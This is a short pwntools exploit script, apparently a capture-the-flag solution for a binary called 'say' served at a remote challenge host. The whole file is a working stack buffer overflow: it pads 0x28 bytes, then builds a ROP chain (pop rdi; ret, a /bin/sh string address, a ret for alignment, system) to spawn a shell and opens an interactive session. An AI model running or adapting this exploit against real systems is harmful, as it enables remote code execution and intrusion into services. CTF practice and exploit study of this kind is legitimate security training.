from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
elf = ELF('./say')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./say')
else:
    io = remote('node.nsctf.cn',54058)

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]

backdoor = 0x40116a
#payload = b'a' * 0x28 + p64(backdoor)

bin_sh_addr = 0x402008
pop_rdi_ret = 0x000000000040123b # pop rdi ; ret
system_addr = 0x401050
ret = 0x0000000000401016 # ret


ROP = flat(
    pop_rdi_ret, bin_sh_addr, ret, 
    system_addr

)
payload = b'a' * 0x28 + ROP
#p()
io.sendafter(b"Please say what you want to say:", payload)


io.interactive()

